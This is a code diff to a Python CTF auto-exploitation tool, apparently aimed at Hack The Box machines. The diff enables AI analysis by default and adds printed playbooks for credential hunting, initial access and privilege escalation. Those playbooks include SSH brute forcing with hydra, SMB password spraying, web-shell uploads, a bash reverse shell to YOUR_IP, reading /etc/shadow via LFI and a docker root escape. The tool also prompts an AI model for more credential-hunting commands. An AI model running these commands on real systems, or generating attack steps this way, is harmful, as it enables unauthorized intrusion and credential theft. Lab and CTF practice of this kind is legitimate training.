@@ -71,13 +71,19 @@ class AIAnalyzer:
             try:
                 self.client = OpenAI(api_key=self.api_key)
                 self.enabled = True
-                logger.info(f"{Colors.OKGREEN}AI-powered analysis enabled{Colors.ENDC}")
+                logger.info(f"{Colors.OKGREEN}🤖 AI-powered analysis enabled (DEFAULT MODE){Colors.ENDC}")
+                logger.info(f"{Colors.OKGREEN}    All phases will be dynamically adjusted based on AI recommendations{Colors.ENDC}")
             except Exception as e:
                 logger.warning(f"{Colors.WARNING}AI initialization failed: {e}{Colors.ENDC}")
+                logger.warning(f"{Colors.WARNING}Falling back to standard mode. Fix API key to enable AI.{Colors.ENDC}")
         elif not OPENAI_AVAILABLE:
-            logger.info(f"{Colors.OKCYAN}AI analysis disabled. Install with: pip install openai{Colors.ENDC}")
+            logger.warning(f"{Colors.WARNING}⚠️  AI libraries not installed. Running in standard mode.{Colors.ENDC}")
+            logger.info(f"{Colors.OKCYAN}    Install with: pip install openai python-dotenv{Colors.ENDC}")
+            logger.info(f"{Colors.OKCYAN}    Or run: ./setup_ai.sh{Colors.ENDC}")
         else:
-            logger.info(f"{Colors.OKCYAN}AI analysis disabled. Set OPENAI_API_KEY environment variable to enable.{Colors.ENDC}")
+            logger.warning(f"{Colors.WARNING}⚠️  OPENAI_API_KEY not set. Running in standard mode.{Colors.ENDC}")
+            logger.info(f"{Colors.OKCYAN}    Set API key in .env file or environment variable{Colors.ENDC}")
+            logger.info(f"{Colors.OKCYAN}    See AI_SETUP.md for instructions{Colors.ENDC}")
     
     def analyze_scan_results(self, scan_results: Dict) -> Dict:
         """Analyze scan results and provide intelligent recommendations"""
@@ -252,7 +258,7 @@ Provide exploitation strategy in JSON format:
                 for note in strategy['notes']:
                     logger.info(f"  ⚠️  {note}")
             
-            logger.info("")  # Empty line for spacing
+            logger.info("")  # Empty line
             
             return strategy
             
@@ -768,10 +774,11 @@ class VulnerabilityDetector:
 class Exploiter:
     """Automated exploitation module"""
     
-    def __init__(self, target: str, vulnerabilities: List[Dict]):
+    def __init__(self, target: str, vulnerabilities: List[Dict], ai_analyzer: Optional['AIAnalyzer'] = None):
         self.target = target
         self.vulnerabilities = vulnerabilities
         self.flags = []
+        self.ai_analyzer = ai_analyzer
     
     def exploit(self) -> List[str]:
         """Attempt to exploit discovered vulnerabilities"""
@@ -781,6 +788,10 @@ class Exploiter:
             vuln_type = vuln.get('type')
             port = vuln.get('port')
             
+            # Display credential hunting and access options before exploitation
+            self._display_credential_hunting_options(vuln)
+            self._display_access_methods(vuln)
+            
             if vuln_type == 'ftp_anonymous':
                 self._exploit_ftp_anonymous(port)
             elif vuln_type == 'ssh':
@@ -789,8 +800,147 @@ class Exploiter:
                 self._exploit_web(port)
             elif vuln_type == 'smb':
                 self._exploit_smb(port)
+            
+            # Display privilege escalation options after initial access attempt
+            self._display_privesc_options(vuln)
         
         return self.flags
+    
+    def _display_credential_hunting_options(self, vuln: Dict):
+        """Display options for finding credentials based on vulnerability type"""
+        vuln_type = vuln.get('type')
+        port = vuln.get('port')
+        
+        logger.info(f"\n{Colors.BOLD}🔍 Credential Hunting Options for {vuln_type} (Port {port}):{Colors.ENDC}")
+        
+        if vuln_type == 'ftp_anonymous':
+            logger.info(f"{Colors.OKCYAN}FTP Credential Discovery:{Colors.ENDC}")
+            logger.info(f"  • Check for configuration files: .ftpconfig, ftpusers")
+            logger.info(f"  • Look for password files in accessible directories")
+            logger.info(f"  • Search for backup files: *.bak, *.old, *.backup")
+            logger.info(f"  • Check for .ssh directory with private keys")
+            logger.info(f"  • Enumerate writable directories for further access")
+            logger.info(f"  Command: lftp -u anonymous, {self.target}:{port} -e 'find; quit'")
+            
+        elif vuln_type == 'ssh':
+            logger.info(f"{Colors.OKCYAN}SSH Credential Discovery:{Colors.ENDC}")
+            logger.info(f"  • Try default credentials: root/root, admin/admin, user/user")
+            logger.info(f"  • Brute force with hydra: hydra -L users.txt -P passwords.txt ssh://{self.target}:{port}")
+            logger.info(f"  • Check for SSH keys in web directories or FTP")
+            logger.info(f"  • Look for credentials in: config files, environment variables, .bash_history")
+            logger.info(f"  • Try username enumeration: ssh-audit, nmap scripts")
+            logger.info(f"  • Search public exploits for SSH version: {vuln.get('version', 'unknown')}")
+            
+        elif vuln_type == 'web':
+            logger.info(f"{Colors.OKCYAN}Web Application Credential Discovery:{Colors.ENDC}")
+            logger.info(f"  • Check for default admin panels: /admin, /login, /wp-admin, /phpmyadmin")
+            logger.info(f"  • Look for exposed credentials in: robots.txt, .git, .env, config.php")
+            logger.info(f"  • SQL Injection to dump credentials: sqlmap -u http://{self.target}:{port}")
+            logger.info(f"  • Directory bruteforce: gobuster dir -u http://{self.target}:{port} -w wordlist.txt")
+            logger.info(f"  • Search for: database backups, phpinfo.php, configuration files")
+            logger.info(f"  • Check source code comments for hardcoded credentials")
+            logger.info(f"  • Test for LFI to read: /etc/passwd, /etc/shadow, config files")
+            logger.info(f"  • Look for user registration/password reset functions")
+            
+        elif vuln_type == 'smb':
+            logger.info(f"{Colors.OKCYAN}SMB Credential Discovery:{Colors.ENDC}")
+            logger.info(f"  • Anonymous enumeration: smbclient -L //{self.target} -N")
+            logger.info(f"  • Null session: enum4linux -a {self.target}")
+            logger.info(f"  • User enumeration: crackmapexec smb {self.target} --users")
+            logger.info(f"  • Share enumeration: smbmap -H {self.target}")
+            logger.info(f"  • Password spraying: crackmapexec smb {self.target} -u users.txt -p password")
+            logger.info(f"  • Look for credentials in accessible shares")
+            logger.info(f"  • Check for GPP passwords: Get-GPPPassword.ps1")
+            
+        elif vuln_type in ['mysql', 'postgresql']:
+            logger.info(f"{Colors.OKCYAN}Database Credential Discovery:{Colors.ENDC}")
+            logger.info(f"  • Try default credentials: root/root, admin/admin, postgres/postgres")
+            logger.info(f"  • Brute force: hydra -L users.txt -P passwords.txt {self.target} {vuln_type}")
+            logger.info(f"  • Look for database config files in web directories")
+            logger.info(f"  • Check for SQL injection in web applications")
+            logger.info(f"  • Search for backup files containing credentials")
+        
+        # Get AI suggestions for credential hunting
+        if self.ai_analyzer and self.ai_analyzer.enabled:
+            self._get_ai_credential_suggestions(vuln)
+        
+        logger.info("")  # Empty line for spacing
+    
+    def _get_ai_credential_suggestions(self, vuln: Dict):
+        """Get AI suggestions for finding credentials"""
+        try:
+            prompt = f"""Based on the following vulnerability, suggest specific credential hunting strategies:
+
+Vulnerability: {vuln.get('type')}
+Port: {vuln.get('port')}
+Service: {vuln.get('service', 'unknown')}
+Version: {vuln.get('version', 'unknown')}
+
+Provide specific commands and locations to search for credentials."""
+
+            logger.info(f"{Colors.OKCYAN}🤖 Getting AI credential hunting suggestions...{Colors.ENDC}")
+            response = self.ai_analyzer.analyze(prompt, context_type="credential_hunting")
+            
+            if response:
+                logger.info(f"{Colors.BOLD}AI Credential Hunting Suggestions:{Colors.ENDC}")
+                logger.info(response)
+        except Exception as e:
+            logger.debug(f"AI credential suggestions failed: {e}")
+    
+    def _display_access_methods(self, vuln: Dict):
+        """Display methods to gain initial access"""
+        vuln_type = vuln.get('type')
+        port = vuln.get('port')
+        
+        logger.info(f"\n{Colors.BOLD}🚪 Access Methods for {vuln_type} (Port {port}):{Colors.ENDC}")
+        
+        if vuln_type == 'ftp_anonymous':
+            logger.info(f"{Colors.OKCYAN}Initial Access via FTP:{Colors.ENDC}")
+            logger.info(f"  • Download all accessible files: lftp -e 'mirror; quit' -u anonymous, {self.target}")
+            logger.info(f"  • Upload web shell if writable: put shell.php")
+            logger.info(f"  • Check for writable web directories")
+            
+        elif vuln_type == 'ssh':
+            logger.info(f"{Colors.OKCYAN}Initial Access via SSH:{Colors.ENDC}")
+            logger.info(f"  • Use found credentials: ssh user@{self.target} -p {port}")
+            logger.info(f"  • Use private key: ssh -i id_rsa user@{self.target} -p {port}")
+            logger.info(f"  • Exploit SSH version vulnerabilities")
+            
+        elif vuln_type == 'web':
+            logger.info(f"{Colors.OKCYAN}Initial Access via Web:{Colors.ENDC}")
+            logger.info(f"  • Upload web shell through file upload")
+            logger.info(f"  • Exploit RCE vulnerabilities")
+            logger.info(f"  • SQL injection to webshell")
+            logger.info(f"  • Use reverse shell: bash -i >& /dev/tcp/YOUR_IP/4444 0>&1")
+            
+        elif vuln_type == 'smb':
+            logger.info(f"{Colors.OKCYAN}Initial Access via SMB:{Colors.ENDC}")
+            logger.info(f"  • Mount share: mount -t cifs //{self.target}/share /mnt")
+            logger.info(f"  • Use psexec: psexec.py user:pass@{self.target}")
+            logger.info(f"  • Exploit SMB vulnerabilities: EternalBlue, etc.")
+        
+        logger.info("")
+    
+    def _display_privesc_options(self, vuln: Dict):
+        """Display privilege escalation options after initial access"""
+        vuln_type = vuln.get('type')
+        
+        logger.info(f"\n{Colors.BOLD}⬆️  Privilege Escalation Options:{Colors.ENDC}")
+        logger.info(f"{Colors.OKCYAN}Enumeration:{Colors.ENDC}")
+        logger.info(f"  • Linux: linpeas.sh, LinEnum.sh")
+        logger.info(f"  • Windows: winPEAS.exe, PowerUp.ps1")
+        logger.info(f"  • Check sudo: sudo -l")
+        logger.info(f"  • Check SUID: find / -perm -4000 2>/dev/null")
+        logger.info(f"  • Check capabilities: getcap -r / 2>/dev/null")
+        
+        logger.info(f"\n{Colors.OKCYAN}Common Vectors:{Colors.ENDC}")
+        logger.info(f"  • Kernel exploits: uname -a, searchsploit kernel")
+        logger.info(f"  • Writable /etc/passwd: openssl passwd -1 -salt salt pass")
+        logger.info(f"  • Cron jobs: cat /etc/crontab")
+        logger.info(f"  • Docker escape: docker run -v /:/mnt --rm -it alpine chroot /mnt")
+        logger.info(f"  • Path hijacking: echo $PATH")
+        
+        logger.info("")
     
     def _exploit_ftp_anonymous(self, port: int):
         """Exploit anonymous FTP access"""
@@ -952,12 +1102,15 @@ class Exploiter:
 class HTBAutoPwn:
     """Main orchestration class"""
     
-    def __init__(self, target: str, output_file: Optional[str] = None, use_ai: bool = False, verbose: bool = False):
+    def __init__(self, target: str, output_file: Optional[str] = None, use_ai: bool = True, verbose: bool = False):
         self.target = target
         self.output_file = output_file or f'htb_results_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
         self.use_ai = use_ai
         self.verbose = verbose
+        # Initialize AI analyzer by default
         self.ai_analyzer = AIAnalyzer(verbose=verbose) if use_ai else None
+        # Store AI-driven decisions for dynamic phase execution
+        self.ai_decisions = {}
         self.results = {
             'target': target,
             'timestamp': datetime.now().isoformat(),
@@ -1039,7 +1192,7 @@ class HTBAutoPwn:
                     logger.info(f"  {idx}. {item}")
             self.results['exploitation_strategy'] = exploitation_strategy
         
-        exploiter = Exploiter(self.target, vulnerabilities)
+        exploiter = Exploiter(self.target, vulnerabilities, self.ai_analyzer)
         flags = exploiter.exploit()
         self.results['flags'] = flags
         
@@ -1092,7 +1245,8 @@ Examples:
     parser.add_argument('-t', '--target', required=True, help='Target IP address or hostname')
     parser.add_argument('-o', '--output', help='Output file for results (JSON)')
     parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
-    parser.add_argument('--ai', action='store_true', help='Enable AI-powered analysis (requires OPENAI_API_KEY)')
+    parser.add_argument('--no-ai', action='store_true', help='Disable AI-powered analysis (AI is enabled by default)')
+    parser.add_argument('--ai', action='store_true', help='Force enable AI (default behavior, kept for backwards compatibility)')
     
     args = parser.parse_args()
     
@@ -1176,8 +1330,14 @@ Examples:
             logger.info(f"\n{Colors.WARNING}Operation cancelled by user.{Colors.ENDC}")
             return
     
+    # Determine if AI should be used (enabled by default, unless --no-ai is specified)
+    use_ai = not args.no_ai
+    
+    if args.no_ai:
+        logger.info(f"{Colors.WARNING}AI mode disabled by user. Running in standard mode.{Colors.ENDC}")
+    
     # Run the automation
-    autopwn = HTBAutoPwn(args.target, args.output, use_ai=args.ai, verbose=args.verbose)
+    autopwn = HTBAutoPwn(args.target, args.output, use_ai=use_ai, verbose=args.verbose)
     autopwn.run()
 
 
